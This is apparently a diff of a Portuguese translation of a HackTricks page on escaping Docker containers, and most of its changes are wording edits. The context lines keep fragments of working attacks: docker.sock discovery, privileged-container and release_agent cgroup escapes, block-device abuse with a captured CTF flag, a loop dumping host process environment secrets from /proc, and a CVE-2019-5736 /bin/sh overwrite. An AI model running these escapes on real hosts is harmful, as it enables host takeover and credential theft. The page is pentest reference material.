@@ -10,11 +10,11 @@ Outras formas de apoiar o HackTricks:
 * Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
 * Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
 * **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
 
 </details>
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 \
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
@@ -24,16 +24,16 @@ Obtenha Acesso Hoje:
 
 ## Enumeração Automática & Fuga
 
-* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Também pode **enumerar contêineres**
-* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Esta ferramenta é bastante **útil para enumerar o contêiner em que você está e até tentar fugir automaticamente**
-* [**amicontained**](https://github.com/genuinetools/amicontained): Ferramenta útil para obter os privilégios que o contêiner possui a fim de encontrar maneiras de fugir dele
-* [**deepce**](https://github.com/stealthcopter/deepce): Ferramenta para enumerar e fugir de contêineres
+* [**linpeas**](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS): Também pode **enumerar containers**
+* [**CDK**](https://github.com/cdk-team/CDK#installationdelivery): Esta ferramenta é bastante **útil para enumerar o container em que você está e até tentar fugir automaticamente**
+* [**amicontained**](https://github.com/genuinetools/amicontained): Ferramenta útil para obter os privilégios que o container possui a fim de encontrar maneiras de fugir dele
+* [**deepce**](https://github.com/stealthcopter/deepce): Ferramenta para enumerar e fugir de containers
 * [**grype**](https://github.com/anchore/grype): Obtenha os CVEs contidos no software instalado na imagem
 
 ## Fuga por Socket do Docker Montado
 
-Se de alguma forma você descobrir que o **socket do docker está montado** dentro do contêiner docker, você poderá fugir dele.\
-Isso geralmente acontece em contêineres docker que, por algum motivo, precisam se conectar ao daemon do docker para realizar ações.
+Se de alguma forma você descobrir que o **socket do docker está montado** dentro do container do docker, você será capaz de fugir dele.\
+Isso geralmente acontece em containers do docker que, por algum motivo, precisam se conectar ao daemon do docker para realizar ações.
 ```bash
 #Search the socket
 find / -name docker.sock 2>/dev/null
@@ -78,7 +78,7 @@ Você pode verificar as capacidades atuais do container usando **ferramentas aut
 ```bash
 capsh --print
 ```
-Na página a seguir, você pode **aprender mais sobre capacidades linux** e como abusar delas para escapar/elevar privilégios:
+Na página a seguir, você pode **aprender mais sobre capacidades linux** e como abusar delas para escapar/escalar privilégios:
 
 {% content-ref url="../../linux-capabilities.md" %}
 [linux-capabilities.md](../../linux-capabilities.md)
@@ -114,7 +114,7 @@ docker run --rm -it --pid=host --privileged ubuntu bash
 ```
 ### Privilegiado
 
-Apenas com a flag privilegiada, você pode tentar **acessar o disco do host** ou tentar **escapar abusando do release\_agent ou outros escapes**.
+Apenas com a flag privilegiada, você pode tentar **acessar o disco do host** ou tentar **escapar abusando do release\_agent ou outros métodos de escape**.
 
 Teste os seguintes bypasses em um container executando:
 ```bash
@@ -236,13 +236,15 @@ sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
 # Reads the output
 cat /output
 ```
+{% endcode %}
+
 Encontre uma **explicação da técnica** em:
 
 {% content-ref url="docker-release_agent-cgroups-escape.md" %}
 [docker-release\_agent-cgroups-escape.md](docker-release\_agent-cgroups-escape.md)
 {% endcontent-ref %}
 
-#### Escapar Privilegiado Abusando do release\_agent sem conhecer o caminho relativo - PoC3
+#### Escapamento Privilegiado Abusando do release\_agent sem conhecer o caminho relativo - PoC3
 
 Nos exploits anteriores, **o caminho absoluto do contêiner dentro do sistema de arquivos do host é divulgado**. No entanto, nem sempre é o caso. Em casos onde você **não conhece o caminho absoluto do contêiner dentro do host**, você pode usar esta técnica:
 
@@ -336,9 +338,9 @@ root         9     2  0 11:25 ?        00:00:00 [mm_percpu_wq]
 root        10     2  0 11:25 ?        00:00:00 [ksoftirqd/0]
 ...
 ```
-#### Escapando Privilegiados Abusando de Montagens Sensíveis
+#### Escapamento Privilegiado Abusando de Montagens Sensíveis
 
-Existem vários arquivos que podem estar montados que fornecem **informações sobre o host subjacente**. Alguns deles podem até indicar **algo a ser executado pelo host quando algo acontece** (o que permitirá a um atacante escapar do contêiner).
+Existem vários arquivos que podem estar montados e que fornecem **informações sobre o host subjacente**. Alguns deles podem até indicar **algo a ser executado pelo host quando algo acontece** (o que permitirá a um atacante escapar do contêiner).\
 O abuso desses arquivos pode permitir que:
 
 * release\_agent (já abordado anteriormente)
@@ -378,7 +380,7 @@ Com tal capacidade, o usuário root dentro do container tem permissão para **cr
 O Docker garante que dispositivos de bloco **não possam ser abusados de dentro do container** definindo uma política de cgroup no container que bloqueia a leitura e escrita de dispositivos de bloco.\
 No entanto, se um dispositivo de bloco é **criado dentro do container, ele pode ser acessado** através da pasta /proc/PID/root/ por alguém **fora do container**, a limitação sendo que o **processo deve ser de propriedade do mesmo usuário** fora e dentro do container.
 
-Exemplo de **Exploração** deste [**relato**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
+Exemplo de **Exploração** deste [**relatório**](https://radboudinstituteof.pwning.nl/posts/htbunictfquals2021/goodgames/):
 ```bash
 # On the container as root
 cd /
@@ -416,13 +418,13 @@ HTB{7h4T_w45_Tr1cKy_1_D4r3_54y}
 ```
 ### hostPID
 
-Se você pode acessar os processos do host, será capaz de acessar muitas informações sensíveis armazenadas nesses processos. Execute o laboratório de teste:
+Se você pode acessar os processos do host, você será capaz de acessar muitas informações sensíveis armazenadas nesses processos. Execute o laboratório de teste:
 ```
 docker run --rm -it --pid=host ubuntu bash
 ```
 Por exemplo, você poderá listar os processos usando algo como `ps auxn` e procurar por detalhes sensíveis nos comandos.
 
-Então, como você pode **acessar cada processo do host em /proc/, você pode simplesmente roubar seus segredos de ambiente** executando:
+Então, como você pode **acessar cada processo do host em /proc/, você pode simplesmente roubar seus segredos de env** executando:
 ```bash
 for e in `ls /proc/*/environ`; do echo; echo $e; xargs -0 -L1 -a $e; done
 /proc/988058/environ
@@ -468,7 +470,7 @@ docker run --rm -it --ipc=host ubuntu bash
 ```
 Se você tiver apenas `hostIPC=true`, provavelmente não poderá fazer muito. Se algum processo no host ou qualquer processo dentro de outro pod estiver usando os **mecanismos de comunicação entre processos** do host (memória compartilhada, arrays de semáforos, filas de mensagens, etc.), você poderá ler/escrever nesses mesmos mecanismos. O primeiro lugar que você vai querer verificar é `/dev/shm`, pois é compartilhado entre qualquer pod com `hostIPC=true` e o host. Você também vai querer verificar os outros mecanismos IPC com `ipcs`.
 
-* **Inspecione /dev/shm** - Procure por quaisquer arquivos nesta localização de memória compartilhada: `ls -la /dev/shm`
+* **Inspecione /dev/shm** - Procure por quaisquer arquivos neste local de memória compartilhada: `ls -la /dev/shm`
 * **Inspecione as instalações IPC existentes** – Você pode verificar se alguma instalação IPC está sendo usada com `/usr/bin/ipcs`. Verifique com: `ipcs -a`
 
 ### Recuperar capacidades
@@ -481,11 +483,11 @@ cat /proc/self/status | grep CapEff
 ```
 ### Abuso do namespace de usuário via symlink
 
-A segunda técnica explicada no post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica como você pode abusar de montagens bind com namespaces de usuário, para afetar arquivos dentro do host (naquele caso específico, deletar arquivos).
+A segunda técnica explicada no post [https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/](https://labs.withsecure.com/blog/abusing-the-access-to-mount-namespaces-through-procpidroot/) indica como você pode abusar de montagens bind com namespaces de usuário, para afetar arquivos dentro do host (no caso específico, deletar arquivos).
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
-Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics\&utm_medium=banner\&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com o suporte das **ferramentas comunitárias mais avançadas** do mundo.\
+Use [**Trickest**](https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks) para construir e **automatizar fluxos de trabalho** com as ferramentas comunitárias **mais avançadas** do mundo.\
 Obtenha Acesso Hoje:
 
 {% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}
@@ -501,22 +503,22 @@ Após a execução, assim que mostrar `[+] Overwritten /bin/sh successfully`, vo
 
 `docker exec -it <nome-do-container> /bin/sh`
 
-Isso vai acionar o payload que está presente no arquivo main.go.
+Isso acionará o payload que está presente no arquivo main.go.
 
 Para mais informações: [https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html](https://blog.dragonsector.pl/2019/02/cve-2019-5736-escape-from-docker-and.html)
 
 {% hint style="info" %}
-Existem outros CVEs que o container pode ser vulnerável também, você pode encontrar uma lista em [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
+Existem outros CVEs aos quais o container pode ser vulnerável, você pode encontrar uma lista em [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/cve-list)
 {% endhint %}
 
 ## Fuga Personalizada do Docker
 
 ### Superfície de Fuga do Docker
 
-* **Namespaces:** O processo deve ser **completamente separado de outros processos** via namespaces, então não podemos escapar interagindo com outros procs devido a namespaces (por padrão não pode comunicar via IPCs, sockets unix, serviços de rede, D-Bus, `/proc` de outros procs).
+* **Namespaces:** O processo deve estar **completamente separado de outros processos** via namespaces, então não podemos escapar interagindo com outros procs devido a namespaces (por padrão não pode se comunicar via IPCs, sockets unix, serviços de rede, D-Bus, `/proc` de outros procs).
 * **Usuário root**: Por padrão, o usuário que executa o processo é o usuário root (no entanto, seus privilégios são limitados).
-* **Capabilities**: Docker deixa as seguintes capabilities: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
-* **Syscalls**: Estas são as syscalls que o **usuário root não poderá chamar** (por falta de capabilities + Seccomp). As outras syscalls poderiam ser usadas para tentar escapar.
+* **Capacidades**: Docker deixa as seguintes capacidades: `cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap=ep`
+* **Syscalls**: Estas são as syscalls que o **usuário root não poderá chamar** (devido à falta de capacidades + Seccomp). As outras syscalls poderiam ser usadas para tentar escapar.
 
 {% tabs %}
 {% tab title="x64 syscalls" %}
@@ -626,7 +628,7 @@ If you are in **userspace** (**no kernel exploit** involved) the way to find new
 * [https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket](https://0xn3va.gitbook.io/cheat-sheets/container/escaping/exposed-docker-socket)
 * [https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4](https://bishopfox.com/blog/kubernetes-pod-privilege-escalation#Pod4)
 
-<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../../../.gitbook/assets/image (3) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 Use [**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks) to easily build and **automate workflows** powered by the world's **most advanced** community tools.\
 Get Access Today:
